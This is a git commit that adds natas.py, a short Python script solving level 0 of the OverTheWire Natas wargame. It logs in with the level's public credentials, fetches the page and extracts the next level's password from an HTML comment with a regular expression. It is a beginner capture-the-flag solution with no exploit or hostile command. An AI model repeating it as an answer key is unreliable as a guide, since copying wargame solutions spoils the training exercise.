5b6f27c344bedb161cd67a63566cdc12f056e064
Abhishek Kumar <78052345+Abhiak99@users.noreply.github.com>
2023-07-12 22:48:22 +0530

    Create natas.py

---
+++ natas/natas.py
@@ -0,0 +1,16 @@
+from requests import *
+import re
+
+username = 'natas0'
+password = 'natas0'
+
+
+url = 'http://'+username+'.natas.labs.overthewire.org'
+
+auth = (username,password)
+
+r = get(url, auth=auth)
+# print(r.text)
+
+match = re.findall('<!--The password for natas1 is (.*) -->', r.text)
+print(match[0])
